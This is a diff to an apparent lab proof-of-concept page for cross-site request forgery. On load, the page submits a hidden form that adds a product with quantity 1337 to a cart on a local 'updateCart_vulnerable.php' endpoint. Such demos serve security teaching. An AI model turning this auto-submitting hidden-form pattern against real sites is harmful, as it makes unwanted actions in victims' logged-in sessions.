@@ -2,9 +2,13 @@
     <head></head>
     <body>
         <script>
+        // What's prefixing e.g. index.php in the URL.
+        let baseURL = "http://localhost:8080/";
+
         let iframe = document.createElement("iframe");
         iframe.name = "myTarget";
         iframe.style.display = "none";
+
 
         function csrf(url, data={}) {
             let form = document.createElement("form");
@@ -30,7 +34,7 @@
 
         window.addEventListener("load", function () {
             document.body.appendChild(iframe);
-            csrf("http://localhost:8080/updateCart.php", {'action': "add", 'product': "2", 'quantity': "1337"});
+            csrf(baseURL + "updateCart_vulnerable.php", {'action': "add", 'product': "2", 'quantity': "1337"});
         });
         </script>
     </body>
